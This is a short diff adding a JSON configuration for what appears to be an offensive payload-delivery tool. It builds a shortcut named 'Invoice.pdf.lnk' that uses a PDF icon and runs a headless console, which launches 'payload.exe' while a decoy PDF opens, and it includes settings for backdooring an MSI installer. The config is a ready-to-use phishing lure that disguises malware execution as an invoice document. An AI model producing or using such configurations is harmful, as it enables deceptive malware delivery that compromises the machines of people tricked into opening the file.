@@ -1,0 +1,17 @@
+{
+  "output_dir": ".",
+  "create_lnk": true,
+  "lnk_name": "Invoice.pdf.lnk",
+  "target_binary": "C:\\Windows\\System32\\conhost.exe",
+  "target_args": "--headless cmd.exe /Q /c payload.exe | decoy.pdf",
+  "icon_source": "C:\\Windows\\System32\\AcroExch.Document.DC.dll",
+  "icon_index": 0,
+  "backdoor_msi": false,
+  "msi_source": null,
+  "create_msi": false,
+  "msi_install_scope": "perMachine",
+  "msi_action_type": "execute_deferred",
+  "payload_binary": "erebus.exe",
+  "payload_args": "",
+  "plugin_configs": {}
+}
